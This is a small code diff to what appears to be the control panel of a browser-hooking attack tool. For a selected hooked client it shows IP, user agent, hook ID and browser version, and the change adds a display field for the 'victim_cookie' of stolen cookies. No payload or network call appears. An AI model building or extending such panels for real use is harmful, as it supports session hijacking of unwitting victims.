@@ -92,7 +92,8 @@ function GetTree(){
     		$("#ip").html(data[treeNode.treeId].IP);
     		$("#ua").html(data[treeNode.treeId].ua);
     		$("#hook_id").html(data[treeNode.treeId].hook_id);
-    		$("#browser_version").html(data[treeNode.treeId].browser_version)
+    		$("#browser_version").html(data[treeNode.treeId].browser_version);
+    		$("#victim_cookie").html(data[treeNode.treeId].cookies)
     		Draw_network(treeNode.treeId);
 		}
 	
